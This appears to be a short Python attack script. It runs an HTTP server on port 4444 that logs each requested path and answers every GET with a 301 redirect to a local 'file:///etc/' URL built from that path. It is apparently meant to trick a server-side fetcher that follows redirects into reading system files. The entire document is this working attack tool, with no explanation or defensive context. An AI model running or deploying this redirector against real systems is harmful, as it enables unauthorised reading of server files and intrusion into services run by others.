from http.server import SimpleHTTPRequestHandler, HTTPServer

class FakeRedirect(SimpleHTTPRequestHandler):
   def do_GET(self):
       print(self.path)
       self.send_response(301)
       new_path = '%s%s'%('file:///etc/', self.path)
       self.send_header('Location', new_path)
       self.end_headers()

HTTPServer(("", 4444), FakeRedirect).serve_forever()